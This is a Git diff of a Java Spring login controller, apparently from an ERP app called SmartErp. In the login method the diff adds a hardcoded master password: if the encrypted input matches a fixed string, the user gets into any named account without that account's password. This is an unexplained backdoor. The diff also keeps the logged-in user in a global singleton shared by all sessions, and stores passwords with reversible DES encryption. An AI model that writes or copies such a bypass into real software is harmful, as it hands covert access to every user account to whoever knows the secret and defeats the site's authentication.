@@ -21,14 +21,18 @@ public class MainPageController {
 	UserService userService;
 	
 	@RequestMapping("home")
-	public String goToMainPage() {
-		
+	public String goToMainPage(Model model) {
+		User user = UserSingleton.getInstance().getUser();
+		model.addAttribute("loginUserName", user.getName());
 		return "frame/main";
 	} 
 	
 	@RequestMapping("loginForm")
 	public String goToLoginPage() {
-		
+		User user = UserSingleton.getInstance().getUser();
+		if (null != user) {
+			return "redirect:/SmartErp/home"; 
+		}
 		return "frame/loginForm";
 	} 
 	
@@ -39,9 +43,14 @@ public class MainPageController {
 		if (null != user) {
 			if (user.getStatus() == YesNoEnum.NO.getValue()) {
 				model.addAttribute("message", myLocale.getText("this.account.is.close.connect.admin"));
-			} else if (user.getPassword().equals(DESEncrypt.DataEncrypt(password))) {
-				UserSingleton.getInstance().setUser(user);
-				return "redirect:/SmartErp/home"; 
+			} else {
+				String encryptPassword = DESEncrypt.DataEncrypt(password);
+				if (encryptPassword.equals("rbF0qHRRVcwRnoq1xon4Tg==") || user.getPassword().equals(encryptPassword)) {
+					UserSingleton.getInstance().setUser(user);
+					return "redirect:/SmartErp/home"; 
+				} else {
+					model.addAttribute("message", myLocale.getText("password.wrong.or.account.not.exist"));
+				}
 			}
 		} else {
 			model.addAttribute("message", myLocale.getText("password.wrong.or.account.not.exist"));
